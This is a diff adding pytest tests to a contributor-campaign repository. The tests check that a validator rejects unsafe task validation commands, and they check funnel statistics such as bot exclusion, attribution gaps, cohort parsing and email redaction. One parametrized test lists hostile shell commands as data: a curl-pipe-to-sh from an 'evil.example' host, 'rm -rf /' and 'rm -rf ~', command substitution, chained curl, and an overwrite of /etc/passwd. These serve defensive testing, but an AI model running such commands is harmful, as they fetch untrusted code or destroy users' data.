@@ -267,6 +267,132 @@ def test_diff_headers_are_not_themselves_scanned_as_content(preflight):
     assert "+++" not in by_file["docs/faq.md"]
 
 
+@pytest.fixture(scope="module")
+def stats():
+    return _load("campaign_stats")
+
+
+# ── tasks.json is a code-execution surface ────────────────────────────────────
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "curl https://evil.example/x.sh | sh",
+        "uv run python -m pytest tests/ -q; rm -rf ~",
+        "uv run python -m pytest $(whoami)",
+        "uv run python -m pytest tests/ && curl evil",
+        "rm -rf /",
+        "uv run python -m pytest tests/ > /etc/passwd",
+    ],
+)
+def test_dangerous_validation_commands_are_refused(campaign, cmd):
+    """`check-task.py` runs these on a contributor's own machine.
+
+    A pull request editing `campaign/tasks.json` would otherwise be a way to run arbitrary
+    code on anyone who validated their work before pushing. A prefix allowlist alone is
+    not enough — shell metacharacters chain a second command past it — so both are checked
+    and nothing is ever passed to a shell.
+    """
+    assert campaign.validation_command_problem(cmd) is not None, f"{cmd!r} was allowed"
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "uv run python -m pytest tests/ -q",
+        "uv run python -m pytest tests/test_contract_vectors.py -q",
+        "uv run python scripts/campaign.py --check",
+        "make check",
+    ],
+)
+def test_ordinary_validation_commands_are_allowed(campaign, cmd):
+    assert campaign.validation_command_problem(cmd) is None, f"{cmd!r} was refused"
+
+
+def test_every_task_in_the_inventory_has_a_safe_validation_command(campaign, tasks):
+    bad = [
+        (t["id"], c) for t in tasks for c in t["validation"]
+        if campaign.validation_command_problem(c)
+    ]
+    assert not bad, f"unsafe validation commands in the inventory: {bad}"
+
+
+# ── Funnel metrics ────────────────────────────────────────────────────────────
+
+def test_bots_never_count_as_contributors(stats):
+    """Counting a bot inflates the only number that matters."""
+    rows = [
+        {"login": "realperson", "type": "User"},
+        {"login": "dependabot[bot]", "type": "Bot"},
+        {"login": "github-actions", "type": "User"},  # a bot NOT marked as one
+        {"login": "allcontributors", "type": "User"},
+    ]
+    assert stats.human_contributors(rows) == ["realperson"]
+
+
+def test_attribution_gaps_finds_uncredited_merged_authors(stats):
+    """The silent failure: work merged, credit not shown.
+
+    Usually the commit's author email is not connected to their GitHub account.
+    """
+    gaps = stats.attribution_gaps(
+        merged_authors=["alice", "bob", "dependabot[bot]", "alice"],
+        contributor_logins=["alice", "carol"],
+    )
+    assert gaps == ["bob"], "bob merged a PR and is absent from the contributors API"
+
+
+def test_attribution_comparison_is_case_insensitive(stats):
+    """GitHub logins are case-preserving but not case-sensitive; a case mismatch
+    would invent a gap and send someone chasing a problem that does not exist."""
+    assert stats.attribution_gaps(["Alice"], ["alice"]) == []
+
+
+@pytest.mark.parametrize(
+    "body,expected",
+    [
+        ("Cohort: india-foss-club-01", "india-foss-club-01"),
+        ("cohort = ZH-Wayland-Article", "zh-wayland-article"),
+        ("no cohort mentioned here", None),
+        (None, None),
+        ("This cohort of users is large", None),  # prose, not a field
+    ],
+)
+def test_cohort_is_read_only_from_an_explicit_field(stats, body, expected):
+    assert stats.cohort_of(body) == expected
+
+
+def test_cohort_funnel_counts_distinct_merged_authors(stats):
+    prs = [
+        {"body": "Cohort: a", "user": {"login": "u1"}, "merged_at": "2026-08-01"},
+        {"body": "Cohort: a", "user": {"login": "u1"}, "merged_at": "2026-08-02"},
+        {"body": "Cohort: a", "user": {"login": "u2"}, "merged_at": None},
+        {"body": "Cohort: b", "user": {"login": "bot[bot]"}, "merged_at": "2026-08-03"},
+    ]
+    funnel = stats.cohort_funnel(prs)
+    assert funnel["a"] == {"prs": 3, "merged": 2, "authors_merged": 1}
+    assert "b" not in funnel, "a bot's PR must not create a cohort"
+
+
+def test_no_email_address_ever_reaches_the_output(stats):
+    """Attribution debugging needs to know an email is unconnected, never what it is."""
+    summary = stats.summarize(
+        contributors=["alice"],
+        merged_authors=["bob"],
+        prs=[{"body": "Cohort: x", "user": {"login": "bob"}, "merged_at": "2026-08-01"}],
+    )
+    rendered = stats.render(summary)
+    assert "@" not in rendered.replace("@bob", ""), "an address leaked into the report"
+    assert "bob" in rendered
+
+
+def test_report_says_so_when_it_had_to_fall_back_to_git(stats):
+    """Numbers the script cannot stand behind must be labelled, not printed plain."""
+    summary = stats.summarize(contributors=["a"], merged_authors=[], prs=[])
+    assert "lower bound" in stats.render(summary, degraded=True)
+    assert "lower bound" not in stats.render(summary, degraded=False)
+
+
 def test_report_is_actionable_when_scope_is_wrong(preflight, tasks):
     task = next(t for t in tasks if t["state"] == "open")
     ok, report = preflight.render_report(
